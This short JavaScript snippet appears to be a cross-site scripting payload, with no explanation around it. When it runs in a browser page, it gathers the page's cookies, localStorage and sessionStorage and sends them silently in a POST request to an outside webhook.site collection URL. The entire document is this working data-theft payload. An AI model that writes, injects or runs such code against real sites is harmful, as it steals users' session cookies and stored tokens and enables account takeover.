(function(){
    var data = {
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
    };
    
    if(typeof fetch !== 'undefined'){
        fetch('https://webhook.site/d699ea0b-e69e-44af-88bf-03cd8d40bebb/collect', {
            method: 'POST',
            mode: 'no-cors',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        });
    }
})();